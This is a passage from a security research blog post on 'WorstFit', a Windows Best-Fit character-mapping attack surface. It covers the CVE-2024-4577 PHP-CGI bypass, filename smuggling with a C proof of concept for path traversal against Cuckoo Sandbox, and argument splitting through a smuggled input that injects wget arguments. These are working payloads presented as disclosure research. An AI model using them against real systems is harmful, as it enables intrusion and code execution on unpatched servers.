&lt;p&gt;But this time, we‚Äôre taking big steps forward ‚Äì showing how those sneaky Best-Fit conversions can operate on a &lt;strong&gt;system-wide level&lt;/strong&gt;, leading to even more impactful exploits, all unfolding right under your nose.&lt;/p&gt;

&lt;p&gt;Now, it‚Äôs time to turn this quirky behaviour into something more impactful: &lt;strong&gt;real WorstFit vulnerabilities&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit ‚Äì The novel attack surface on Windows&lt;/h2&gt;

&lt;p&gt;By delving into the Best-Fit feature, we can harness this unexpected character transformation as a brand-new attack surface on Windows systems. Here, we‚Äôll explore three intriguing attack techniques that exploit this behavior: &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt; and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Let‚Äôs dive into each of these techniques to see how this seemingly thoughtful (at least, from Microsoft‚Äôs perspective at the time) feature can lead to critical vulnerabilities!&lt;/p&gt;

&lt;h3 id=&quot;-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;üî• The nightmare of East-Asia - CVE-2024-4577:&lt;/h3&gt;

&lt;p&gt;The first ever WorstFit attack is CVE-2024-4577. This vulnerability allows attackers to compromise any PHP-CGI server configured with Chinese or Japanese code pages using nothing more than a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; request!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 932 (Japanese), 936 (Simplified Chinese), 950 (Traditional Chinese)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;shy;&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00AD&quot;&gt;U+00AD&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Back in 2012, a vulnerability in PHP-CGI was discovered. The issue stemmed from Apache automatically treating the query string as the first argument for the CGI program. Exploitation was straightforward ‚Äì argument injection. By appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?-s&lt;/code&gt; to a request, attackers could leak the page‚Äôs source code. Furthermore, it‚Äôs also possible to achieve Remote Code Execution (RCE).&lt;/p&gt;

&lt;p&gt;Of course, PHP quickly patched the issue. The fix was also simple: stop parsing arguments if the query string starts with a dash.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;QUERY_STRING&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decoded_qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* skip leading spaces */&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;-&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;skip_getopt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... omitted ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The patch worked well, and no one broke it for the past 12 years. However, while reviewing the patch, we couldn‚Äôt help but feel that this blacklist approach seemed weak. After some quick fuzzing, we discovered a simple bypass: appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?%ADs&lt;/code&gt; to the query string effortlessly!&lt;/p&gt;

&lt;p&gt;As investigating more, we discovered that U+00AD (soft hyphen) is mapped to a dash (-) on Chinese (936, 950) and Japanese (932) code pages due to &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior, which explains how the bypass works.&lt;/p&gt;

&lt;p&gt;This is the first time we‚Äôve encountered the term ‚ÄúBest-Fit‚Äù. We found it super interesting, which motivated us to take a deeper look.&lt;/p&gt;

&lt;h3 id=&quot;-filename-smuggling&quot;&gt;üî• Filename Smuggling&lt;/h3&gt;

&lt;p&gt;The next attack we would like to introduce is the WorstFit in the filename processing. Here, we focus on characters that mapped to either &lt;strong&gt;‚Äù/‚Äù (0x2F)&lt;/strong&gt; or &lt;strong&gt;‚Äù\‚Äù (0x5C)&lt;/strong&gt;, such as the currency symbol &lt;a href=&quot;https://en.wikipedia.org/wiki/Won_sign&quot;&gt;Yen (¬•)&lt;/a&gt;, and &lt;a href=&quot;https://en.wikipedia.org/wiki/Yen_and_yuan_sign&quot;&gt;Won (‚Ç©)&lt;/a&gt; used in Japanese and Korean Code Pages, as well as the &lt;a href=&quot;https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)&quot;&gt;fullwidth&lt;/a&gt; version of the (back-)slash in most Code Pages. You can check the affected characters and Code Pages on our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x2f&quot;&gt;Characters mapped to ‚Äú/‚Äù (0x2F)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to ‚Äú\‚Äù (0x5C)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getcwd&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindFirstFileA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/findfirst-functions?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;findfirst*&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfullpathnamea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetFullPathNameA&lt;/code&gt;&lt;/a&gt;, ‚Ä¶&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ôºè&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF0F&quot;&gt;U+FF0F&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ôºº&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¬•&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‚Ç©&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let‚Äôs start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d8.exe&lt;/code&gt;) uses the ANSI API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA()&lt;/code&gt; to obtain the current working directory. This means that if we can have a working direcotry with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/4.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;‚Üë Unintended file access on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/windows/win.ini&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Another case is the implementation of mruby &lt;a href=&quot;https://github.com/mruby/mruby/blob/3.3.0/mrbgems/mruby-dir/src/dir.c#L23&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;&lt;/a&gt; on Windows, the function relied on the ANSI version of CRT (C Runtime Library) &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_getcwd()&lt;/code&gt;&lt;/a&gt; to retrieve the current directory. This also means that we can pollute that function‚Äôs return value, leading to Path Traversal, too!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/5.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;‚Üë Pollute the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Of course, the above cases are still bugs instead of real vulneraiblities. Let‚Äôs take a look at some real-world cases!&lt;/p&gt;

&lt;h4 id=&quot;-case-study---path-traversal-to-rce-on-cuckoo-sandbox&quot;&gt;‚û§ Case Study - Path Traversal to RCE on Cuckoo Sandbox&lt;/h4&gt;

&lt;p&gt;Before diving into the vulnerability, it‚Äôs important to discuss Python first because it plays a significant role in this case! Conceptually, Python allows strings to be represented in two different types: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unicode&lt;/code&gt; in Python 2, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes&lt;/code&gt; in Python 3.&lt;/p&gt;

&lt;p&gt;To support both string representations, the implementation of filesystem access used a structure field to determine whether a target path was wide or narrow. If the string was narrow, the corresponding ANSI API was used to process the path, making it susceptible to the Best-Fit behavior. Although &lt;a href=&quot;https://peps.python.org/pep-0529/&quot;&gt;PEP 529&lt;/a&gt; later standardized the filesystem encoding on Windows to UTF-8, earlier versions ‚Äî such as Python 2 and Python 3 (prior to version 3.6) ‚Äî remained vulnerable to WorstFit attacks.&lt;/p&gt;

&lt;p&gt;With the above context in mind, let‚Äôs have our first target ‚Äî &lt;a href=&quot;https://cuckoosandbox.org/index.html&quot;&gt;Cuckoo Sandbox&lt;/a&gt;, a well-known automated malware analysis platform. As one of the few open-source solutions for malware analysis in early days, it was the go-to choice for organizations building their own platforms, and for malware researchers seeking to extend its functionality. However, since Cuckoo has not been actively maintained for many years, the latest official version still relies on Python 2.7, which exposes it to our WorstFit Attack!&lt;/p&gt;

&lt;p&gt;Cuckoo consists of two main components: the &lt;strong&gt;Cuckoo Host&lt;/strong&gt; and the &lt;strong&gt;VM Cluster&lt;/strong&gt;. The uploaded samples are isolated within virtual machines to ensure they do not affect the Cuckoo. The components use a dedicated channel to synchronize the behaviors such as captured network packets, dropped files, and output logs with their own mechanism. However, since the Cuckoo Host is written in Python and relied on an outdated version, a dropped file with a Unicode filename can traverse the path on the Cuckoo Host!&lt;/p&gt;

&lt;p&gt;Here‚Äôs a simple Proof of Concept:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;AAAA\u00a5..\u00a5..\u00a5..\u00a5..\u00a5..\u00a5conf\u00a5cuckoo.conf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;filePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_ALWAYS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the analysis has finished, users can view the logs and dropped files generated by the malware through the web interface. An attacker can trigger a file operation on Python by clicking the download button. The Cuckoo Host then processes a translated path, containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; and sends sensitive data to the attacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The attacker can then download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuckoo.conf&lt;/code&gt;, and gathered serveral sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-argument-splitting&quot;&gt;üî• Argument Splitting&lt;/h3&gt;

&lt;p&gt;We can also exploit the WorstFit behavior in command line parsing by manipulating the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. With this trick, even if you can control just a small part of an argument, that‚Äôs more than enough to inject as many arguments as you want!&lt;/p&gt;

&lt;p&gt;This time, we‚Äôre zeroing in on characters that map to either a double quote (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;, 0x22) or a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;, 0x5C). Once again, fullwidth characters come in handy here, and when it comes to backslashes, those currency symbols we talked about earlier make a comeback!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x22&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://worst.fit/mapping/#to%3A0x5c&quot;&gt;Characters mapped to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandlineA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-language/main-function-and-program-execution?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: 874, 125x, 932 (JP), 949 (KR)&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ÔºÇ&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF02&quot;&gt;U+FF02&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ôºº&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¬•&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‚Ç©&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let‚Äôs circle back to the piece of code we discussed earlier. How might this seemingly simple snippet fail, and more importantly, how could an attacker exploit it?&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer is quite simple. If an attacker provides the input: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ÔºÇ --use-askpass=calc ÔºÇ&lt;/code&gt;
It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;

&lt;p&gt;At this point, you might be thinking, &lt;em&gt;‚ÄúOh, it‚Äôs PHP messing up again, isn‚Äôt it? I know PHP always‚Ä¶‚Äù&lt;/em&gt; But nope ‚Äì even switching to &lt;strong&gt;Node.js&lt;/strong&gt;, &lt;strong&gt;Rust&lt;/strong&gt;, or &lt;strong&gt;Python&lt;/strong&gt; doesn‚Äôt save you. Here‚Äôs an example in Python, and the same input works like a charm ‚Äì this time on the latest version of Python, not just older ones:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/fetch&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wget&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://example.tld/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Done&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, is this wget‚Äôs problem? Well, spoiler alert: yes, it‚Äôs part of the issue, but it doesn‚Äôt stop there. The same trick works on other executables like &lt;strong&gt;openssl.exe&lt;/strong&gt;, &lt;strong&gt;tar.exe&lt;/strong&gt;, &lt;strong&gt;java.exe&lt;/strong&gt;, and more CLI tools. This makes us realize, this can actually be a broader systemic issue with how argument handling works on Windows, creating an attack surface across various tools. So, how does it happen?&lt;/p&gt;

